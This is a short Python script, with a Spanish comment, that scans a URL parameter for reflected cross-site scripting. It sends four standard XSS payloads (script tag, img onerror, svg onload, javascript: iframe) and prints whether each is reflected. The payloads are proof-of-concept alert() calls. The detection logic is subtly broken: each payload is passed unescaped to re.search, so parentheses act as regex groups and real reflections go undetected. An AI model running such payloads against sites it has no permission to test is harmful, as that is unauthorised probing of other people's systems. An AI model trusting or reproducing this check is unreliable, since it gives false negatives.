import requests
import re

def xss_scan(url):
    payloads = ['<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>', '<svg/onload=alert("XSS")>', '<iframe src="javascript:alert(`XSS`)"></iframe>']
    for payload in payloads:
        r = requests.get(url + payload)
        if re.search(payload, r.text):
            print(f"[+] Vulnerable to XSS with payload: {payload}")
        else:
            print(f"[-] Not vulnerable with payload: {payload}")

# Ejemplo de uso
url = 'https://www.example.com/page.php?search='
xss_scan(url)
